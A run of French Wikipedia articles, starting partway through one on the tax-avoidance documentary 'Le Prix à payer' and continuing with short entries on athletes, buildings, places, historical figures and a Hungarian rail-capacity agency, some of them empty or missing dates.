Le documentaire porte sur les mécanismes d'évasion fiscale grâce auxquels les multinationales parviennent à ne pas payer des milliards de dollars en impôt. Cette évasion fiscale conduit à un accroissement des inégalités de revenu, et appauvrit les classes moyennes. Le film s'efforce en particulier de montrer le rôle de la place financière de Londres dans cette évasion fiscale en s'appuyant notamment sur l'expertise du Tax Justice Network. 
Le documentaire est raconté par d'anciens "Insiders" de la finance et de la technologie, des spécialistes, des journalistes et par des militants de la justice fiscale.
Liste des intervenants.
Ainsi que des serveurs et serveuses de bars à Dublin, les dirigeants des National United Nurses dans une manifestation en faveur de la taxe Robin des Bois à New York, et des manifestants provenant d'un peu partout dans le monde…
Accueil critique.
Le journaliste Jean-Luc Porquet juge ce documentaire et considère que son intérêt est mais qu'ils ont permis . 
Pour la journaliste Sophie Fay du Nouvel Observateur le film est "digne d"'Inside Job"". 
Le journaliste américain Joe Leyden de Variety parle d'un "documentaire concis, précis, parfois lisse et poli, mais à la crédibilité et à l'impact puissants". 
Serge Kaganski du journal français Les Inrockuptibles écrit : "Le Prix à Payer met le doigt bien profond dans la plaie de la fraude et de l'optimisation fiscales, deux maux, qui sont au cœur des problèmes politico-économiques".
Autour du film.
En complément du documentaire d'Harold Crooks, un jeu sous forme de plateforme interactive web a vu le jour. Le jeu hébergé par ICI Radio-Canada se nomme "Le Prix à payer : Quand l'impôt devient un jeu, faites un maximum de profits en payant le moins d'impôts possible". Il propose aux joueurs de se glisser dans la peau d'entrepreneurs qui souhaitent transformer leurs entreprises de petite taille en grandes multinationales tout en expérimentant les stratégies et optimisations fiscales de différents pays (Canada, Brésil, États-Unis, Irlande, France, Îles Caïmans, Luxembourg ou encore Hong-Kong). 

</doc>
<doc id="8728712" url="https://fr.wikipedia.org/wiki?curid=8728712" title="Dimitri Kovalev (handball)">
Dimitri Kovalev (handball)

Dimitri Sergeïevitch Kovalev () , né le à Omsk, est un joueur de handball russe évoluant au poste d'ailier droit. 
Avec l'équipe de Russie, il participe notamment aux Jeux olympiques de Pékin en 2008.

</doc>
<doc id="8728723" url="https://fr.wikipedia.org/wiki?curid=8728723" title="Ahmad Salah Alwan">
Ahmad Salah Alwan

Ahmad Salah Alwan Mntafjai () (né le en Irak) est un footballeur international irakien, qui évolue au poste d'attaquant.
Biographie.
Carrière en club.
Il gagne 6 fois le championnat d'Irak avec les équipes de Al-Zawra'a SC (1966, 1999 et 2000), Talaba SC (2002) et Erbil SC (2007 et 2008).
Carrière en sélection.
Avec l'équipe d'Irak, il joue 28 matchs (pour 5 buts inscrits) entre 2002 et 2008. 
Il figure dans le groupe des sélectionnés lors de la Coupe d'Asie des nations de 2004, où il atteint le stade des quarts de finale. 
Il participe également aux Jeux olympiques de 2004. Il joue deux matchs lors du tournoi olympique organisé en Grèce.
Il joue enfin 4 matchs comptant pour les éliminatoires des coupes du monde 2006 et 2010.

</doc>
<doc id="8728725" url="https://fr.wikipedia.org/wiki?curid=8728725" title="Liste des titres musicaux numéro un aux États-Unis en 1987">
Liste des titres musicaux numéro un aux États-Unis en 1987

Cette page liste les titres musicaux ayant eu le plus de succès au cours de l'année 1987 aux États-Unis d'après le magazine "Billboard".
Historique.
! Date
! Artiste(s)
! Titre
!Référence
Liens externes.
Classement des singles sur Billboard.com

</doc>
<doc id="8728729" url="https://fr.wikipedia.org/wiki?curid=8728729" title="Adel Bousmal">
Adel Bousmal

Adel Bousmal (né le ) est un joueur de handball Algérien. Il évolue au sein du Mesleki Yeterlilik et de l'équipe nationale d'Algérie.
Il participe notamment au Championnat du monde 2015.
Palmarès.
avec l'Équipe d'Algérie.
Championnat du monde de handball 
Championnat d'Afrique.
Autres

</doc>
<doc id="8728734" url="https://fr.wikipedia.org/wiki?curid=8728734" title="HRK Izviđač">
HRK Izviđač



</doc>
<doc id="8728736" url="https://fr.wikipedia.org/wiki?curid=8728736" title="Johannisthaler Chaussee (métro de Berlin)">
Johannisthaler Chaussee (métro de Berlin)

Johannisthaler Chaussee est une station de la ligne 7 du métro de Berlin en Allemagne, située dans le quartier de Gropiusstadt, de l'arrondissement de Neukölln.
Situation.
La station est établie sous la rue du même nom, entre Britz-Süd au nord-ouest, en direction de Rathaus Spandau, et Lipschitzallee au sud-est, en direction de Rudow. Elle dessert la nouvelle cité construite dans les années 1960 et est aussi surnommée « Gropiusstadt ».
Historique.
Elle est ouverte le lors de la mise en service d'un prolongement de la ligne entre Britz-Süd et Zwickauer Damm.
La station est conçue par l'architecte Rainer G. Rümmler qui fait dans la simplicité. Les halls d'entrée d'origine, tels qu'ils étaient en 1970, n'existent plus. Les murs sont décorés de carreaux gris, interrompus par une bande blanche où est inscrit le nom de la station. Les supports centraux sont recouverts de plaques métalliques. Le plafond et le quai central sont en gris.
Service des voyageurs.
Accueil.
La station comprend un quai central accessible par un escalier au milieu qui mène devant le centre commercial Gropius Passagen et une sortie à l'extrémité nord de la plateforme qui mène à un vestibule. Elle est équipée d'ascenseurs et d'escaliers mécaniques qui la rendent totalement accessible aux personnes à mobilité réduite.
Desserte.
Johannisthaler Chaussee est desservie par les rames circulant sur la ligne 7 du métro.
Intermodalité.
La station de métro est en correspondance avec les lignes , M11, X11 et X71 de la BVG.

</doc>
<doc id="8728741" url="https://fr.wikipedia.org/wiki?curid=8728741" title="Hichem Daoud">
Hichem Daoud

Hichem Daoud (né le ) est un joueur de handball Algérien. Il évolue au sein du Istres PH et de l'équipe nationale d'Algérie.
Il participe notamment au Championnat du monde 2015.
Palmarès.
avec les Clubs.
Istres OPH
avec l'Équipe d'Algérie.
Championnat du monde de handball
Championnat du monde junior
Championnat d'Afrique
Autres

</doc>
<doc id="8728742" url="https://fr.wikipedia.org/wiki?curid=8728742" title="Legal Hustle">
Legal Hustle

Legal Hustle est le troisième album studio de Cormega, sorti le .
L'album s'est classé au Top Independent Albums, au Top R&amp;B/Hip-Hop Albums et au Billboard 200.

</doc>
<doc id="8728748" url="https://fr.wikipedia.org/wiki?curid=8728748" title="NLPR">
NLPR



</doc>
<doc id="8728749" url="https://fr.wikipedia.org/wiki?curid=8728749" title="Abderrahim Berriah">
Abderrahim Berriah

Abderrahim Berriah (né le ) est un joueur de handball algérien. Il évolue au sein du Tremblay Handball et de l'équipe nationale d'Algérie
Il participe notamment au Championnat du monde 2015.
Palmarès.
avec l'Équipe d'Algérie.
Championnat du monde de handball 
Championnat du monde jeunes
Championnat d'Afrique
Autres

</doc>
<doc id="8728752" url="https://fr.wikipedia.org/wiki?curid=8728752" title="IPad Air II">
IPad Air II



</doc>
<doc id="8728757" url="https://fr.wikipedia.org/wiki?curid=8728757" title="Uday Taleb">
Uday Taleb

Uday Taleb Jawad () (né le ou le selon les sources) est un footballeur international irakien, qui évolue au poste de gardien de but.
Biographie.
Carrière en sélection.
Avec l'équipe d'Irak, il joue cinq matchs (pour aucun but inscrit) entre 2002 et 2004. 
Il figure dans le groupe des sélectionnés lors de la coupe d'Asie des nations de 2004, où il atteint le stade des quarts de finale.
Il participe également à la Coupe des confédérations de 2009, ainsi qu'aux JO de 2004.
Il joue enfin un match comptant pour les éliminatoires de la coupe du monde 2006.

</doc>
<doc id="8728758" url="https://fr.wikipedia.org/wiki?curid=8728758" title="Tarek Boukhemis">
Tarek Boukhemis

Tarek Boukhemis (né le ) est un joueur de handball algérien. Il évolue au sein du JSE Skikda et de l'équipe nationale d'Algérie.
Il participe notamment au Championnat du monde 2015
Palmarès.
avec l'Équipe d'Algérie.
Championnat du monde de handball 
Championnat d'Afrique
Autres

</doc>
<doc id="8728764" url="https://fr.wikipedia.org/wiki?curid=8728764" title="The Covent-Garden Tragedy">
The Covent-Garden Tragedy

" (La Tragédie de Covent-Garden)" est une pièce de théâtre de Henry Fielding. La première représentation a eu lieu le au théâtre royal de Drury Lane en même temps que celle d'une autre, intitulée "Les Vieux Débauchés." "La Tragédie de Covent-Garden" met en scène un triangle amoureux dans un lupanar et implique deux prostituées qui, bien qu'il en soit fait un portrait satirique, apparaissent sous un jour sympathique au fur et à mesure que progresse leur relation.
Argument.
La pièce décrit un triangle amoureux dans un bordel entre, d'une part deux prostituées, Kissinda et Stormandra, et d'autre part, Lovegirlo. Le spectateur est amené à éprouver de la sympathie pour les personnages à mesure que leurs relations se développent. L'intrigue se complique lorsque le capitaine Bilkum cherche à conquérir Stormanda. Finalement Bilkum est tué en duel et l'on comprend que Stormandra se suicide, ce qui se révélera finalement faux.
Commentaire.
La pièce est une satire de la tragédie en général, mais les personnages présentent des traits réalistes qui les distinguent de ceux des autres pièces de Fielding et qui ne respectent pas les règles de la comédie canonique. La pièce a été un échec et ne fut plus jouée après sa première et unique représentation, en partie en raison du fait que l'action se déroule dans un bordel. Les critiques de l'époque ont relevé cet échec et l'une d'entre elles portait sur l'ampleur des connaissances que manifestait l'auteur sur les maisons de prostitution. En revanche, les critiques modernes ont rendu grâce aux mérites de la pièce, du moins abstraction faite de son cadre.

</doc>
<doc id="8728765" url="https://fr.wikipedia.org/wiki?curid=8728765" title="Messaoud Layadi">
Messaoud Layadi

Messaoud Layadi, né le est un joueur de handball Algérien. Il évolue au sein du GS Pétroliers et de l'équipe nationale d'Algérie.
Palmarès.
avec l'Équipe d'Algérie.
Autres

</doc>
<doc id="8728767" url="https://fr.wikipedia.org/wiki?curid=8728767" title="Ahmad Jassim">
Ahmad Jassim

Ahmad Jassim Mohammed () (né le en Irak) est un joueur de football international irakien, qui évoluait au poste de gardien de but.
Biographie.
Carrière en sélection.
Avec l'équipe d'Irak, il figure dans le groupe des sélectionnés lors de la coupe du monde de 1986, comme gardien remplaçant. 
Il participe également aux JO de 1988, toujours comme remplaçant.
Il joue enfin six matchs comptant pour les éliminatoires de la coupe du monde 1990.

</doc>
<doc id="8728769" url="https://fr.wikipedia.org/wiki?curid=8728769" title="Khaled Chentout">
Khaled Chentout

Khaled Chentout (né le à la casbah, Alger Algérie) est un joueur de handball algérien. Il a commencé à jouer à l'équipe de la casbah, puis el Hammamet, puis Bab el oued, puis avec l’équipe nationale algérienne minime. En 2007, il est parti en Espagne où il a joué quelque temps avec l'équipe B de Barcelone. Il évolue au sein du Nøtterøy HB et de l'équipe nationale d'Algérie.
Il a participé et obtenu la coupe d'Afrique en 2014. Il participe notamment au Championnat du monde 2015.
Palmarès.
avec l'Équipe d'Algérie.
Championnat d'Afrique
Championnat du monde de handball

</doc>
<doc id="8728770" url="https://fr.wikipedia.org/wiki?curid=8728770" title="Warren Bennis">
Warren Bennis

Warren Bennis (1925-2014) est un universitaire et auteur américain expert en leadership.
Il a été conseiller des présidents John Fitzgerald Kennedy, Lyndon B. Johnson, Gerald Ford, Ronald Reagan ainsi que de plusieurs entrepreneurs parmi lesquels Howard D. Schultz de Starbucks . Il a publié une trentaine d'ouvrages dont plusieurs avec Burt Nanus.
Il pense que le monde est mieux géré par des leaders plutôt que des managers et a remis en cause le système traditionnel de la hiérarchie, souvent source de corruption et/ou d'inertie.
Son travail a inspiré le modèle actuel de gestion des entreprises, privées ou publiques, plus humain, plus respectueux, plus démocratique, plus souple.

</doc>
<doc id="8728773" url="https://fr.wikipedia.org/wiki?curid=8728773" title="Abdellah Benmenni">
Abdellah Benmenni

Abdellah Benmenni (né le ) est un joueur de handball algérien. Il évolue au sein du Mouloudia Club d'Alger GS Pétroliers et de l'équipe nationale d'Algérie
Il participe notamment au Championnat du monde 2015. Et championnat d'Afrique des nations handball 2016 et 2018.
Palmarès.
avec l'Équipe d'Algérie.
Championnat du monde de handball 
Championnat d'Afrique 

</doc>
<doc id="8728774" url="https://fr.wikipedia.org/wiki?curid=8728774" title="Maison Bénard">
Maison Bénard

La maison Bénard est une maison de style Art nouveau construite à Liège par l'architecte Paul Jaspar en 1895.
Situation.
La maison de l'imprimeur Auguste Bénard (1854-1907) se situe dans le centre de Liège au de la rue Lambert-le-Bègue menant du boulevard de la Sauvenière au quartier de la gare de Liège-Jonfosse.
Historique.
Cette construction de Paul Jaspar est considérée comme étant la première réalisation d'un immeuble de style Art nouveau à Liège. Elle date de 1895 soit deux années seulement après la construction du premier immeuble de ce style : l'hôtel Tassel par Victor Horta à Bruxelles. L'architecture de la Maison Bénard aurait été fortement influencée par celle de la maison personnelle de l'architecte bruxellois Paul Hankar qui était le beau-frère de Paul Jaspar.
Description.
La façade.
La façade initiale est formée de deux travées asymétriques et de trois niveaux. 
À gauche de ces deux travées, se trouve un porche constitué d'un arc brisé et légèrement outrepassé qui sera souvent repris dans les œuvres de Paul Jaspar. Ce porche était initialement surmonté d'un sgraffite représentant une dame assise un livre à la main faisant référence au métier d'imprimeur du propriétaire. Par la suite, des transformations ont ajouté trois niveaux au-dessus de ce porche et le sgraffite fut remplacé par des fenêtres..
Le soubassement de la maison est composé de pierres calcaires vitrifiées dans la masse et de pierres de taille. Le reste de l'immeuble est bâti en brique rouge mais entrecoupé par un bandeau de pierre bleue à hauteur de la baie du premier niveau. 
La travée de gauche est la plus représentative du style art nouveau. Un oriel reposant sur des consoles de pierres de taille supporte un petit balcon ouvragé. L'oriel est prolongé au niveau supérieur par des deux piliers rejoignant une audacieuse corniche très avancée.
La porte d'entrée en bois clair est sculptée de neuf grandes alvéoles rectangulaires aux coins arrondis. Elle est très ressemblante à la porte d'entrée de la Maison Charles Magnette réalisée par le même architecte.
L'intérieur.
Le mobilier initial de la Maison Bénard a été montré lors de l'exposition dédiée à Paul Jaspar au Grand Curtius jusqu'au . Outre le mobilier, il existe aussi une cheminée avec carrelages en céramique et des vitraux représentant un vol de canards.

</doc>
<doc id="8728777" url="https://fr.wikipedia.org/wiki?curid=8728777" title="Hungry Dirty Baby">
Hungry Dirty Baby

Hungry Dirty Baby est le quatrième album studio de Mademoiselle K, le premier en auto production, sorti le , pour les versions CD et audio numérique, et le , pour la version vinyle.

</doc>
<doc id="8728778" url="https://fr.wikipedia.org/wiki?curid=8728778" title="Halle au Blé de Rouffach">
Halle au Blé de Rouffach



</doc>
<doc id="8728781" url="https://fr.wikipedia.org/wiki?curid=8728781" title="Blizzard de Janvier 2015 dans le Nord-Est de l'Amérique du Nord">
Blizzard de Janvier 2015 dans le Nord-Est de l'Amérique du Nord



</doc>
<doc id="8728787" url="https://fr.wikipedia.org/wiki?curid=8728787" title="Turić">
Turić

Turić peut désigner 2 localités de Bosnie-Herzégovine qui constituaient une seule et même entité avant la guerre de Bosnie-Herzégovine :

</doc>
<doc id="8728792" url="https://fr.wikipedia.org/wiki?curid=8728792" title="Auguste François Bucher de Chauvigné">
Auguste François Bucher de Chauvigné

Auguste François Bucher de Chauvigné, né le à Angers (paroisse Saint-Maurille) en Anjou, mort le jour complémentaire de l'an XI () au château de la Violette à Grez-Neuville, est un émigré, et chef militaire chouan dit Lowinski ou "Louvensky" et "Lowensky."
Biographie.
Issu d'une famille de l'Anjou anoblie en 1781 par la désignation comme maire de la ville d'Angers de 1781 à 1785 de son père, Anselme René Bucher de Chauvigné, seigneur de Chauvigné.
Il épouse Marie Verdier de la Miltière, fille du magistrat angevin Verdier de la Miltière, le (Messidor, an IX). Il est le père de Gustave Bucher de Chauvigné (1802-1866), député de Maine-et-Loire.
L'émigration.
En 1791, il fait les campagnes de l'émigration, embarqué à Anvers en Belgique avec ses compatriotes Sapinaud de Boishuguet, de la Noue, de Sainte-Marie, de la Frégeolière et Dumesnil Dupineau, débarqué à Berg-op-Zoom en Hollande, puis Rotterdam et la Haye, où il combat dans le corps de hussards de la Légion de Béon, corps de l'armée des émigrés, créé en mars 1793 par le comte de Béon.
Pendant la campagne de 1794 dans les Provinces-Unies, il fait partie des Hussards de Choiseul, sous le nom de M. de Saint-Brice, nom d'un fief dont il était le sieur de par son père.
Il rejoint ensuite Louis XVIII en Pologne où il prend le nom de "Lowinski".
La Chouannerie.
Auguste François Bucher de Chauvigné est de retour en France en 1799, sous le Consulat lors de la troisième guerre de Vendée (1799-1800).
Il fut chargé de commander la de l’armée catholique et royale du Maine du comte de Bourmont, qui porte son nom, "la légion Lowinski", qu'il organise et en devient son premier chef, le territoire de cette légion s'étendait entre les rivières de la Sarthe et du Loir.
En octobre 1799, il évolue avec d'autres chefs de légion, "Parallowski, Gaullier, Beauregard", autour de Précigné, Tiercé et des communes situées entre La Flèche et Angers. Le 20 octobre, il prend part avec sa légion à la bataille de Ballée en Mayenne.
Le , il est nommé Colonel, chef de la de la division du Maine par le comte de Bourmont. Le 22 janvier 1800, Il est présent à la bataille de Meslay en Mayenne lorsque le général républicain Chabot surprend et bat les troupes royalistes.
Amnistie du Six Floréal An Dix.
Auguste François Bucher de Chauvigné après avoir juré fidélité à la Constitution le 23 Brumaire An IX (14 novembre 1800), bénéficie de l'amnistie concernant les anciens émigrés, en application de l'article 12 du Senatus Consulte en date du 6 Floréal An X (26 avril 1802). 
Le général Gouvion, inspecteur-général de la Gendarmerie nationale, dans un courrier au Ministre de la Justice, du 6 Nivôse An XII (28 décembre 1803), décrit Lowinski : « "était dans la chouannerie dont il était chef sous Bourmont ; marié depuis à Angers à la fille d’un juge ; il passe pour avoir peu de moyens, il vit tranquille" ». 
En réalité, Lowinski était décédé 3 mois auparavant, le au château de la Violette à Grez-Neuville « "des suites d'une blessure reçue en rejoignant l'armée du comte de Puisaye en Normandie »". 
La légion Lowinski.
En 1815, pendant les Cent-Jours et la période dite de la petite chouannerie, 12 ans après le décès de son premier chef, la légion Lowinski renait. À la suite d'une réunion au château de la Besnerie, le vicomte Eugène de la Bonninière de Beaumont est élu par les officiers de ce corps où figure René Cottereau, comme leur nouveau chef. Cette légion est sous les ordres du chef de division Bernard de la Frégeolière, composant la de l'armée royale de la rive droite de la Loire, dite division Bernard. Le 9 juin 1815, la légion Lowinski participe à la prise de la ville du Lude dans la Sarthe.

</doc>
<doc id="8728801" url="https://fr.wikipedia.org/wiki?curid=8728801" title="Aldhelm de Sherborne">
Aldhelm de Sherborne



</doc>
<doc id="8728804" url="https://fr.wikipedia.org/wiki?curid=8728804" title="Music for Prancing">
Music for Prancing

 est un album de jazz West Coast du saxophoniste ténor Warne Marsh. 
Enregistrement.
Musiciens.
La session d'enregistrement est interprétée par un quartet composé de:

</doc>
<doc id="8728824" url="https://fr.wikipedia.org/wiki?curid=8728824" title="Mercedes-Benz Sonderklasse (Type 112)">
Mercedes-Benz Sonderklasse (Type 112)



</doc>
<doc id="8728829" url="https://fr.wikipedia.org/wiki?curid=8728829" title="Ligne Tōgane">
Ligne Tōgane

La est une ligne ferroviaire du réseau JR East au Japon. Elle relie les gares d'Ōami et Narutō dans la préfecture de Chiba.
Histoire.
La ligne Tōgane ouvrit entre Ōami et Tōgane en 1900. En 1907, la ligne est nationalisée par la Société gouvernementale des chemins de fer japonais qui prolonge la ligne à Narutō en 1911.
La ligne est électrifiée en depuis le .
Caractéristiques.
Services et interconnexion.
À Ōami, certains trains continuent sur la ligne Sotobō jusqu'à la gare de Chiba. Il existe un aller-retour quotidien entre les gares de Tokyo et Narutō.
Matériel roulant.
La ligne Tōgane est parcourue par des rames 209 et E233.

</doc>
<doc id="8728831" url="https://fr.wikipedia.org/wiki?curid=8728831" title="Jean-Louis Michon">
Jean-Louis Michon

, né le à Nancy et mort le à Genève, est un traducteur, essayiste, érudit pérennialiste et soufi français.
Biographie.
Jeunesse.
Jean-Louis Michon est élevé à Nancy en milieu bourgeois dans le catholicisme traditionnel. Durant ses études il découvre les écrits de René Guénon par l'entremise d'un libraire chez qui lui et ses amis se réunissent régulièrement pour philosopher sur les problèmes du monde ; Guénon devient leur maître à penser. Il obtient son baccalauréat en philosophie, puis une licence d'anglais. Après deux années de droit à Nancy, il poursuit ses études à la Sorbonne et obtient une maîtrise en droit, puis s'inscrit à l'Institut d'études politiques de Paris (Sciences Po).
Façonné par la pensée de René Guénon, « un rayon de la lumière céleste projeté dans un monde malade », Michon découvre dans les musées parisiens « la richesse de la culture et de la spiritualité japonaise ». Il n'a plus qu'une idée : se rendre au Japon pour y trouver un maître zen. Comme l'accès au Japon en guerre était impossible en ce début de 1945, Michon s'engage dans un régiment de parachutistes se préparant à une mission au Japon, avec l'idée qu'une fois sur place, il se dépouillera de ses habits militaires pour se mettre à la recherche d'un maître spirituel. En , quelques jours avant l'envol du régiment, la bombe tombe sur Hiroshima. Michon rentre à Paris.
Il termine avec succès Sciences Po et découvre dans la bibliothèque de cet institut un article sur le cheikh algérien Ahmad al-Alawi et la voie soufie. L'effet est immédiat : il est convaincu que ce sera sa voie. Les Éditions Traditionnelles lui fournissent l'adresse de Frithjof Schuon en Suisse et de Michel Vâlsan à Paris. Il se convertit à l'islam en présence de M. Vâlsan, qu'il fréquente assidûment et qui le familiarise avec la pensée d'Ibn Arabi. Il est ensuite initié par F. Schuon et rejoint sa tariqa. Il reçoit le nom musulman de Alî Abd al-Khâliq.
Vie adulte.
De 1946 à 1949, Jean-Louis Michon enseigne l'anglais à Damas et durant les vacances rend visite à René Guénon au Caire. Il apprend l'arabe et étudie l'art islamique. En 1950, il s'installe à Lausanne près de Frithjof Schuon, s'investit dans de nouvelles études et obtient un diplôme de dessinateur en bâtiment. Il se marie en 1953 et travaille dans un bureau d'architectes jusqu'en 1955. Lors d'un voyage dans l'Ouest américain, le couple est adopté dans la tribu des Crows par l'homme-médecine Thomas Yellowtail.&lt;br&gt;
De 1955 à 1972, il est traducteur-réviseur permanent auprès de l'Organisation mondiale de la santé (OMS) et vit à Genève. Cette fonction lui permet de rencontrer le Dalaï-lama en privé lors du congrès de l'OMS à New-Delhi en 1961. Parallèlement à son emploi, il est doctorant à la Sorbonne et voyage régulièrement au Maroc dans le cadre de sa thèse qui porte sur le soufi marocain Ahmad ibn Ajiba (1746-1809) et son "Mi`râj", un glossaire de la mystique musulmane. Il obtient son doctorat en Etudes arabes et islamiques en 1966.
Désigné par l'UNESCO et le gouvernement marocain pour préparer un programme de préservation des arts traditionnels, il séjourne avec sa famille au Maroc de 1972 à 1979 et participe à la constitution de l'« Inventaire général du patrimoine culturel », ainsi qu'au lancement de la campagne pour la sauvegarde de la médina de Fès, dirigée par Titus Burckhardt.
Après sa retraite, Michon est régulièrement mandaté par l'UNESCO ou par le gouvernement marocain pour différents projets : la création d'une école d'artisanat traditionnel à Fès, la préparation et la publication d'un "Répertoire de l'artisanat marocain", la fondation du "Centre de conservation et de réhabilitation des kasbahs du Sud" à Ouarzazate, la restauration du ksar d'Aït-ben-Haddou. En Oman, il œuvrera à la restauration de la citadelle de Bahla ; au Bahreïn, ce sera l'inventaire des sites historiques ; en Ouzbékistan, l'évaluation de l'état de conservation des sites historiques de Khiva, Boukhara, Samarcande et Chakhrisabz.
Lors de ses retours en Suisse, il écrit et traduit, notamment une traduction française du Coran, ainsi que l'ouvrage réputé de son ami Martin Lings, "Le Prophète Muhammad : sa vie d'après les sources les plus anciennes", publié aux Éditions du Seuil.
Il meurt à Genève le , à l'âge de 88 ans.

</doc>
<doc id="8728832" url="https://fr.wikipedia.org/wiki?curid=8728832" title="31 décembre 1845">
31 décembre 1845

Le est le jour de l'année 1845 du calendrier grégorien. Il s'agit d'un mercredi. 

</doc>
<doc id="8728852" url="https://fr.wikipedia.org/wiki?curid=8728852" title="Église Saint-Martin de Sare">
Église Saint-Martin de Sare

L'église Saint-Martin est une église catholique située à Sare, en France. Elle est située au centre du bourg, dont la position au sommet d’une colline indique l'ancienneté d’un noyau de peuplement cherchant à se mettre à l’abri des convoitises des brigands. L’église elle-même est un édifice fortifié. Sa décoration intérieure est classée par le ministère de la Culture depuis 1982.
Localisation.
L'église est située à Sare, dans le département français des Pyrénées-Atlantiques. Elle constitue, avec la mairie et le fronton, le triptyque classique au Pays basque, au sein du quartier "Plaza" , qui a probablement accueilli le noyau urbain primitif de la localité. Le quartier est juché sur un mamelon, comme beaucoup de foyers de peuplement au Moyen Âge, pour assurer sa défense. Derrière l’église Saint-Martin, la maison "Ospitalia" semble indiquer qu’une étape du pèlerinage de Saint-Jacques-de-Compostelle, bien qu’éloignée des voies principales, a existé dans le village.
Historique.
Le "Livre d'or de la cathédrale de Bayonne" (ou "cartulaire de la cathédrale de Bayonne") indique en 1142 que la paroisse de Sare possède une église. L'église actuelle a conservé quelques vestiges de cette époque, en particulier les fondations des murs porteurs.
Elle fut surélevée à l’initiative et sur les deniers du curé Pedro de Axular en 1641. Comme partout au Pays basque, la vague de conversions au christianisme du et du début du nécessita l’augmentation de la capacité d’accueil des églises. On doit à l’évêque de Bayonne l’idée de répliquer le système des galeries existant dans les trinquets, et d’ériger à partir de 1556 des tribunes en bois dans les églises.
L'église est dédiée depuis l'origine à saint Martin de Tours, auquel vint s'ajouter, en 1837, une dévotion à Marie. Quelque sont consacrés, en France, à saint Martin.
L'édifice est inscrit au titre des monuments historiques en 1982, pour son décor intérieur.
Description.
Il s’agit d’un édifice rectangulaire dont les dimensions intérieures sont de de long pour une largeur de ; sa nef s’élève à de hauteur ; elle est dominée par un clocher qui culmine à et dont la fonction semble avoir été, outre de contenir les cloches, la surveillance du cirque de frontière qui suit la ligne de crête. Il s’agit d’une église fortifiée, dont les murs de base sont d’une épaisseur de . L’église Saint-Martin, avec ses trois galeries en « U », offre environ . 
Elle recèle un ensemble de mobilier inventorié par le ministère de la Culture. D'autre part, une plaque signale la tombe et la place traditionnelle des benoîtes. 
Sur le mur du clocher, au-dessus de l'horloge, se trouve une plaque portant l'inscription : (« toutes les heures blessent l'homme, la dernière l'envoie au tombeau »). 
L’orgue de l’église, œuvre de Gaston Maille, est en place depuis 1904 ; il a fait l'objet d'une restauration en 2014.

</doc>
<doc id="8728871" url="https://fr.wikipedia.org/wiki?curid=8728871" title="Guido Levi">
Guido Levi

Guido Salomone Levi, né le à Tunis et mort le dans le , est un antifasciste italien. 
Biographie.
Guido Levi, fils de Guglielmo Levi, médecin (né en 1868 à Livourne) et de Ines Funaro, naît à Tunis dans une famille juive de Toscane. En 1894, sa famille quitte Livourne et s’installe en Tunisie. Une sœur, Elia, nait à Tunis le . 
Il étudie la médecine à Gênes de 1913 à 1917 ; il poursuit ses études à la faculté de médecine et chirurgie de l’université de Rome. Il obtient son diplôme et s’installe à nouveau à Tunis où il ouvre un cabinet de gynécologie obstétrique. À Tunis il est connu pour être un antifasciste ; à partir de 1932 il est fiché par la division de police politique du Ministère italien de l’Intérieur, qui reçoit tous les rapports rédigés par des informateurs. Dans un de ces rapports, rédigé le , il est qualifié de « dangereux propagandiste intellectuel ». 
Levi a été membre de la section tunisienne de la Ligue italienne des droits de l'homme (LIDU), de l’"Union démocratique franco-italienne" et de la "Ligue des juifs italiens contre le racisme", ainsi qu'un ami et collaborateur du fondateur de la LIDU, Luigi Campolonghi. 
Après l’entrée en guerre de l’Italie en il est recherché pour arrestation par les autorités italiennes. Il soutient les antifascistes italiens qui mènent une vie précaire en France et en Algérie, notamment , interné à Tiaret par le régime de Vichy, auquel il fournit des médicaments, de l’argent et du soutien moral. Pendant l’occupation allemande de la Tunisie il est contraint de se cacher. 
Dans l’après-guerre, il reprend son activité professionnelle à Tunis, puis à Issy-les-Moulineaux. Il meurt à Paris.

</doc>
<doc id="8728891" url="https://fr.wikipedia.org/wiki?curid=8728891" title="Zelinja Gornja (Gradačac)">
Zelinja Gornja (Gradačac)

Zelinja Gornja (en cyrillique : ) est un village de Bosnie-Herzégovine. Il est situé dans la municipalité de Gradačac, dans le canton de Tuzla et dans la fédération de Bosnie-et-Herzégovine. Selon les premiers résultats du recensement bosnien de 2013, il ne compte plus aucun habitant.
Avant la guerre de Bosnie-Herzégovine, le village faisait entièrement partie de la municipalité de Gradačac ; après la guerre, une portion de son territoire a été rattachée à la municipalité de Doboj, intégrée à la république serbe de Bosnie.

</doc>
<doc id="8728896" url="https://fr.wikipedia.org/wiki?curid=8728896" title="Zelinja Gornja">
Zelinja Gornja

Zelinja Gornja peut désigner 2 localités de Bosnie-Herzégovine qui constituaient une seule et même entité avant la guerre de Bosnie-Herzégovine :

</doc>
<doc id="8728904" url="https://fr.wikipedia.org/wiki?curid=8728904" title="Lac du Sourd">
Lac du Sourd

Le lac du Sourd est un plan d'eau douce de la municipalité de Notre-Dame-du-Laus, dans de la municipalité régionale de comté (MRC) Antoine-Labelle, dans la région administrative de Laurentides, au Québec, au Canada.
Ce lac est situé en région forestière dans la réserve faunique de Papineau-Labelle.
Géographie.
Le lac du Sourd est situé à à l'ouest du lac Gagnon (Papineau), à au sud-ouest au lac Montjoie (Laurentides), à à l'est du Lac du Poisson-Blanc (Notre-Dame-du-Laus) et à au nord-ouest du lac Simon (Papineau).
Le lac du Sourd est alimenté par :
Le lac du Sourd se déverse au fond d'une baie au sud du lac, dans la rivière du Sourd. Cette rivière se dirige vers le sud en recueillant les eaux du ruisseau Ross, Black, Fourchu et Saint-Denis.
Toponymie.
Jadis, ce lac était désigné "Lac des Ours".
Le toponyme "Lac du sourd" a été officialisé le à la Banque des noms de lieux de la Commission de toponymie du Québec.

</doc>
<doc id="8728905" url="https://fr.wikipedia.org/wiki?curid=8728905" title="Vasúti Pályakapacitás-elosztó">
Vasúti Pályakapacitás-elosztó

Le Vasúti Pályakapacitás-elosztó (nom complet "Vasúti Pályakapacitás-elosztó Korlátolt Felelősségű Társaság" pour "Bureau de répartition des capacités ferroviaires, société à responsabilité limitée", ou VPE), est un organisme propriété de l'État hongrois, ayant compétence à l'échelle nationale pour l'attribution des capacités du réseau ferroviaire du pays et pour la détermination des frais d'accès. Il est également responsable de la création et la publication des documents de références.
Histoire.
En 2004, pour respecter la politique européenne des transports ferroviaires, l'État hongrois est amené à créer un organisme, dénommé « Vasúti Pályakapacitás-elosztó (VPE) », indépendant de l'entreprise ferroviaire nationale (Magyar Államvasutak) et du gestionnaire de l'infrastructure, pour l'attribution des capacités de son réseau ferroviaire et la détermination de ses frais d'accès. La société est ensuite rachetée par la Hungarian Privatization and State Holding Co. et devient une entité privée.
